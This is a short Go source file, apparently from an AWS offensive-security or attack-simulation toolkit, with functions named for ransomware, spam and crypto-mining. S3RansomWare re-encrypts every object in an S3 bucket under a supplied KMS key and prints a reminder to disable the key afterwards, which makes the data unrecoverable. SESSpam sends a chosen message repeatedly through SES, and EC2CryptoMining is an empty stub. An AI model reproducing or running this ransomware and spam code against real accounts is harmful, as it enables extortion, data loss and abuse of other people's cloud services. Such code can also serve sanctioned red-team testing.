package awsdata

import (
	"fmt"

	"github.com/aws/aws-sdk-go/aws/session"
)

func S3RansomWare(sess *session.Session, bucket string, kmsArn string) {
	GetBucketVersioning(sess, bucket)
	objects := ListObjects(sess, bucket)
	for _, o := range objects.Contents {
		fmt.Println(*o.Key)
		CopyObject(sess, bucket, *o.Key, kmsArn)
	}
	fmt.Println("\n**All files encrypted. Disable KMS key after encryption")
}

func SESSpam(sess *session.Session, account string, from string, to string, subject string, body string, count int) {
	ListEmailIdentities(sess)
	ListIdentities(sess)
	for i := 0; i < count; i++ {
		SendEmail(sess, body, to, from, subject)
	}
	SendEmail(sess, body, to, from, subject)
	out := fmt.Sprintf("%v emails sent to %v", count, to)
	fmt.Println(out)
}

func EC2CryptoMining(sess *session.Session) {

}
